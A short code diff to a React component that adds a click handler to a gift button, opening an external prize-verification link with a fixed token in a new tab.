@@ -278,6 +278,12 @@ export default function GenerateStatus() {
                     <div className="w-full max-w-[70vw] iphonese:max-w-[70vw] iphone12pro:max-w-[70vw] iphonexr:max-w-[70vw] ipadmini:max-w-[60vw] ipadpro:max-w-[50vw]">
                       <button
                         className={`w-full inline-flex items-center justify-center bg-white iphonese:p-2 p-3 rounded-lg shadow-lg hover:bg-gray-100 transition-all duration-200 ${LineSeed.className}`}
+                        onClick={() =>
+                          window.open(
+                            "http://chiselda.ddns.net:7000/api/verify?token=YWR2ZW50dXJlUHJpemU=",
+                            "_blank"
+                          )
+                        }
                       >
                         <Gift className="w-6 h-6 ml-2" />
                         <p
